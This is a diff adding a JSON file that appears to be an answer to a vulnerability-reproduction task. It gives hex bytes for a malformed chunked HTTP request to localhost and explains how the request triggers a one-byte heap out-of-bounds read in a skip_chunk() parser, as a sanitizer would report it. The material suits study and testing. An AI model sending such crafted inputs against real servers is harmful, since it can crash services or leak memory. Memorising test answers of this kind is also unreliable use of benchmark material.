@@ -1,0 +1,7 @@
+```json
+{
+  "hex_bytes": "50 4f 53 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0d 0a 0d 0a 33 0d 0a 61 62 0d 0d 0a 30 0d 0a 0d 0a",
+  "explanation": "The request uses chunked transfer encoding to activate the vulnerable parser. The body consists of a single data chunk followed by the zero-length terminating chunk.\n- `POST / HTTP/1.1...Transfer-Encoding: chunked\\r\\n\\r\\n`: Standard headers to initiate a chunked-encoded request.\n- `3\\r\\n`: Declares the first chunk to be 3 bytes long.\n- `ab\\r`: The 3 bytes of chunk data. Crucially, the data itself ends with a carriage return (`\\r`).\n- `\\r\\n`: The chunk terminator.\n- `0\\r\\n\\r\\n`: The final chunk, terminating the request body.\n\nThe vulnerability is in `skip_chunk()`, which searches for the `\\r\\n` chunk terminator. When the server processes the `ab\\r` data, it is placed in a buffer of length 3. The function iterates to the end of this buffer. At index `i=2`, it finds `buf[i] == '\\r'`. The vulnerable check is `if (len < i + 1 || ...)`. With `len=3` and `i=2`, `len < i + 1` (i.e., `3 < 3`) is false. The code then proceeds to the next check, `buf[i + 1]`, which attempts to read `buf[3]`. This is a one-byte out-of-bounds read past the end of the heap-allocated buffer.",
+  "expected_effect": "A heap-buffer-overflow sanitizer (like ASan) should report a one-byte out-of-bounds read at the line containing `buf[i + 1]` in the `skip_chunk` function."
+}
+```
